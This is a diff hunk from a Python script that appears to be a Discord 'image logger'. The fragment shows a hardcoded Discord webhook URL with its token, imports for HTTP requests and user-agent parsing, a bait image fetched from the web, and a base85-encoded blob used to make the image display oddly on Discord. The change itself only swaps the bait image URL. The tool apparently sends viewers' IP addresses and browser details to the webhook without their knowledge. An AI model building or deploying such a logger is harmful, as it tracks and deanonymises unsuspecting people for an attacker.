@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1564712257328255056/1vpQNc3pQAlSFUFlmCII6yfWlhgvqpdpczNamyl1Fb9XfE-cwgTTv7yS57Y-3uDAhT2M'
 
-bindata = httpx.get('https://tenor.com/view/koko-the-clown-dance-ghost-gif-17312662').content
+bindata = httpx.get('https://i.pinimg.com/736x/fd/a7/de/fda7dec2a2546407e699d21b811b193e.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
